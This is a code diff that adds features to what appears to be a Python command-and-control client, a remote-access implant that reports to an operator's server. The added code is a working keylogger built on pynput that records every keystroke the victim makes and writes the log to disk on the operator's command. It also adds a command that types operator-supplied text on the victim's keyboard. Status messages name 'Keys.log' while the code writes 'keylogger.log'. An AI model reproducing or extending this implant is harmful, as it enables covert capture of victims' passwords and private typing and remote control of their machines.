@@ -7,6 +7,7 @@ from os import chdir, getenv, uname, getcwd, mkdir, path
 import platform, socket, time
 from subprocess import PIPE, STDOUT, run
 from pyperclip import paste, PyperclipWindowsException, PyperclipException
+from pynput.keyboard import Listener, Controller
 from requests import exceptions, get, post, put
 from crypt import cipher
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
@@ -29,6 +30,10 @@ def get_filename(input_string, replace=True):
     except IndexError:
         post_to_server(f"You must enter a argument after {input_string}.\n")
 
+def on_press(key_press):
+    global key_log
+    key_log.append(key_press)
+
 # Check the operating system
 if platform.system() == "Windows":
     # Windows environment
@@ -40,6 +45,8 @@ encrypted_client = cipher.encrypt(client.encode()).decode() # encoder
 
 delay = DELAY
 clip_count = 0
+listener = None
+key_log = []
 
 # PROXY = {"https": "proxy.some-site.com:443"}
 while True:
@@ -160,6 +167,49 @@ while True:
             else:
                 post_to_server(f"clipboard_{clip_count}.txt has been saved.\n")
 
+    elif cmd == C2Commands.CLS_KLON.value:
+        if listener is None:
+            listener = Listener(on_press=on_press)
+            listener.start()
+            post_to_server("A keylogger is now running on the client.\n")
+        else:
+            post_to_server("A keylogger is already running on the client.\n")
+
+    # The "client keylog off" command will shut down the keylogger and write the results to disk
+    elif cmd == C2Commands.CLS_KLOF.value:
+
+        # Stop the listener and open Keys.log for appending our logged keys
+        if listener is not None:
+            listener.stop()
+            with open("keylogger.log", "a") as file_handle:
+
+                # Read in each key and make it a little more readable for us
+                for a_key_press in key_log:
+                    print(type(a_key_press))
+                    file_handle.write(str(a_key_press).replace("Key.enter", "\n").replace("'", "")
+                                      .replace("Key.space", " ").replace('""', "'")
+                                      .replace("Key.shift_r", "").replace("Key.shift_l", ""))
+
+                # Clear the key_log list and re-initialize the listener to signify "not on"
+                key_log.clear()
+                listener = None
+                post_to_server("Key logging is now disabled on the client. Results are in Keys.log\n")
+        else:
+            post_to_server("Key logging is not enabled on the client.\n")
+
+    # The "client type TEXT" command will type some text on the client's keyboard
+    elif cmd.startswith(C2Commands.CLS_TYPE.value):
+        keyboard = None
+        try:
+            # Split out the text to type and join it back together as a string, then type it
+            text = " ".join(cmd.split()[2:])
+            keyboard = Controller()
+            keyboard.type(text)
+            post_to_server(f"Your message was typed on the client's keyboard.\n")
+        except IndexError:
+            post_to_server(f"You must enter some text to type on the client.\n")
+        except keyboard.InvalidCharacterException:
+            post_to_server(f"A non-typeable character was encountered.\n")
   
     print(response.status_code)
     #print(f"Response Object: {response.request.headers}\n\tHeader: {response.headers}\n\tReason: {response.reason}\n\tStatus: {response.status_code}")
